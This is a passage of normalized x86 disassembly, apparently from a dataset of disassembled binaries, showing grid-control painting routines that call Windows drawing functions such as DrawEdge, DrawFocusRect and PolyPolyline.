mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
add eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0xc ]
shl eax 0x2
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
shr eax 0x2
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call PolyPolyline
cmp edi [ ebx + 0x10 ]
jg r-xdata
inc edi
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx eax
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] esi
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
mov [ ecx + edx * 4 ] esi
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ edx + eax * 4 ] ecx
add [ ebp - 0xc ] 0x2
sub_47290c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0xc ]
je r-xdata
test bl bl
jne r-xdata
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_472724
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_472724
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_472724
pop ecx
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_472724
pop ecx
jmp r-xdata
sub_47299c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x1c ]
add ebx 0xfffffffc
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x29 ] eax
jmp r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2d ] eax
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
call sub_4763a4
add eax [ ebp - 0x29 ]
mov [ ebp - 0x21 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add eax [ ebp - 0x21 ]
mov [ ebp - 0x29 ] eax
inc [ ebp - 0xc ]
mov eax [ ebx ]
cmp edi [ eax + 0x21c ]
jl r-xdata
mov eax [ ebx ]
mov edx edi
call sub_476384
add eax [ ebp - 0x2d ]
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x25 ]
cmp eax [ ebp - 0x2d ]
jle r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add eax [ ebp - 0x25 ]
mov [ ebp - 0x2d ] eax
inc edi
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call RectVisible
test eax eax
je r-xdata
mov al [ ebp + 0x8 ]
mov [ ebp - 0xd ] al
mov eax [ ebx ]
call sub_4721b0
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea ecx [ eax - 0x80 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_470ee4
test al al
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
test [ ebp - 0xd ] 0x2
je r-xdata
or [ ebp - 0xd ] 0x1
mov eax [ ebx ]
cmp edi [ eax + 0x228 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x4
je r-xdata
or [ ebp - 0xd ] 0x2
mov eax [ ebx ]
mov esi [ eax + 0x208 ]
mov eax [ ebx ]
mov edx [ eax + 0x68 ]
mov eax esi
call sub_41e3e0
test [ ebp - 0xd ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_41dbec
test [ ebp - 0xd ] 0x2
je r-xdata
lea eax [ ebp - 0x2d ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
test [ ebp - 0xd ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov edx 0xff00000d
call sub_41dbec
mov eax [ esi + 0xc ]
mov edx 0xff00000e
call sub_41d400
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
lea edx [ ebp - 0x2d ]
mov eax esi
call sub_41dfc4
test [ ebp - 0xd ] 0x2
je r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
mov edx [ ebp + 0x1c ]
or eax [ edx - 0x88 ]
je r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x3d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x4
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x8
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add [ ebp - 0x35 ] eax
jmp r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x88 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add [ ebp - 0x31 ] eax
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x1d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call DrawFocusRect
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call DrawFocusRect
jmp r-xdata
sub_472cd2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
lea edi [ ebp - 0x70 ]
mov eax [ ebx ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4c0
mov edx edi
mov eax [ ebx ]
call sub_473310
cmp [ edi ] 0x0
jg r-xdata
mov dl 0x1
mov eax [ ebx ]
call sub_4737fc
mov esi 0xc0c0c0
mov eax [ ebx ]
mov edx [ edi + 0x40 ]
sub edx [ eax + 0x25c ]
mov eax [ ebx ]
add edx [ eax + 0x23c ]
mov eax [ ebx ]
push [ eax + 0x258 ]
mov eax [ edi + 0x10 ]
pop ecx
sub eax ecx
mov ecx [ ebx ]
add eax [ ecx + 0x238 ]
call sub_4243fc
add eax 0x3
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x3
add eax eax
call sub_4726dc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4726dc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx 0x2
mov edx [ ebp - 0xc ]
call sub_4726d0
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
call sub_41cf40
cmp eax 0xc0c0c0
jne r-xdata
cmp [ edi + 0x30 ] 0x0
jle r-xdata
push ebp
push 0x0
xor eax eax
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_47290c
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_47290c
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
xor eax eax
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_47290c
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push esi
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x4
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x8
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_47290c
pop ecx
mov eax [ ebp - 0x10 ]
call sub_47270c
mov eax [ ebp - 0x8 ]
call sub_47270c
mov esi 0x808080
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
call sub_4763c4
xor eax eax
mov [ ebp - 0x84 ] eax
xor eax eax
mov [ ebp - 0x88 ] eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
je r-xdata
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x88 ] 0x1
push ebp
push 0x0
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_47299c
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_47299c
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
xor ecx ecx
xor eax eax
call sub_47299c
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
call sub_47299c
pop ecx
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
or [ ebp - 0x84 ] 0x8
or [ ebp - 0x88 ] 0x2
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
je r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ edi + 0x3c ]
jge r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
mov eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
xor edx edx
mov eax [ edi + 0x8 ]
call sub_4129b0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41dfc4
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x38 ]
xor eax eax
call sub_4129b0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41dfc4
mov eax [ ebx ]
mov si 0xffb5
call sub_40349c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebx ]
call sub_4737fc
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
call sub_4763c4
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0xb8 ]
mov eax [ ebx ]
call sub_474138
mov eax [ ebx ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
push edi
lea esi [ ebp - 0xb8 ]
lea edi [ ebp - 0xa8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41e4e4
push eax
call DrawFocusRect
lea edx [ ebp - 0xb8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41df90
jmp r-xdata
sub_4731cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp esi [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x20 ]
dec edx
mov [ ebp - 0xc ] esi
xor eax eax
mov edx [ ebx + 0x18 ]
dec edx
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] 0xffffffff
mov esi eax
sub edx esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_473234
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d7fc
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov esi [ ebx + 0x1c ]
mov edi [ ebx + 0x20 ]
dec edi
mov [ ebp - 0xc ] eax
xor esi esi
mov edi [ ebx + 0x18 ]
dec edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d7fc
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] 0xffffffff
sub edi esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_4732b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
push ebp
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_473234
pop ecx
mov [ edi ] eax
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4731cc
mov [ edi ] eax
jmp r-xdata
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_4731cc
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473310
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d840
push eax
mov eax ebx
call sub_43d7fc
mov ecx eax
mov edx esi
mov eax ebx
call sub_473394
pop esi
pop ebx
retn
sub_473334
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x10 ] eax
mov esi [ ebx + 0x1c ]
mov eax [ ebx + 0x20 ]
dec eax
sub eax esi
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x10 ] esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x14 ] eax
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov edx eax
add edx [ ebx ]
cmp edx [ ebx + 0x8 ]
jge r-xdata
sub_473394
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_473450
mov eax ebx
mov edx esi
call sub_473334
lea eax [ ebx + 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_473334
pop esi
pop ebx
pop ebp
retn 0x4
sub_4733c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x2 ] dx
mov ebx eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x248 ]
and ax [ ebp - 0x2 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
inc esi
xor edi edi
xor eax eax
mov [ ebx + 0x4 ] eax
mov esi [ ebp - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add eax [ ebx ]
add [ ebx + 0x4 ] eax
inc edi
dec esi
jne r-xdata
sub_473450
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_476384
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x238 ]
mov eax ebx
mov dx [ r-xdata ]
call sub_4733c0
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_4763a4
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x23c ]
lea eax [ ebx + 0x30 ]
mov dx [ r-xdata ]
call sub_4733c0
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_4734d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax [ ebx ]
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
sub eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ ebp - 0x10 ] eax
dec esi
inc [ ebp - 0x10 ]
jne r-xdata
sub [ ebp - 0xc ] eax
mov eax [ ebx ]
sub [ ebp - 0xc ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jle r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jg r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
sub_473548
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov edx [ ebx ]
mov eax esi
call sub_4734d4
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
lea eax [ esi + 0x30 ]
call sub_4734d4
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_473578
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov ebx [ edi + 0x4 ]
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x14 ] 0x7
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x20 ]
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x14 ] 0x7
mov edx [ ebp - 0x14 ]
sub edx eax
shr edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d7fc
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
cmp eax [ edi + 0x8 ]
jne r-xdata
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
cmp eax [ ebp - 0x4 ]
jl r-xdata
add ebx [ edi ]
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
add eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
mov [ edx ] eax
mov eax [ edi + 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
mov [ edx ] eax
mov eax [ edi + 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov eax [ edi + 0x2c ]
call [ edi + 0x28 ]
add ebx eax
cmp ebx [ edi + 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ eax ] ebx
sub ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
sub_473690
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
